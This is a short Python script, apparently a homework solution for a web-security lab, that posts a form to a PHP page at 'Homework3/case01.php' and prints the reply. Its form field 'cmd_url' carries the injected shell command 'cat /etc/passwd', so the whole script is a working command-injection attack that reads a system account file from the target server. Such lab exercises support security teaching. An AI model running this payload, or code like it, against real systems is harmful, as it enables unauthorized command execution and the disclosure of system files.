from urllib.parse import urlencode
from urllib.request import Request, urlopen

url = 'http://www.wsb.com/Homework3/case01.php'
# prepare the value of the form which includes the attack payload
values = dict(cmd_url='cat /etc/passwd')
data = urlencode(values).encode()
#submit the form
req = Request(url, data)
rsp = urlopen(req)
#read the return result
content = rsp.read().decode()

print(content)

#import webbrowser
#url = "http://www.wsb.com/Homework3/case01.php"
#new = 2 #open in new window
#webbrowser.open(url,new=new)
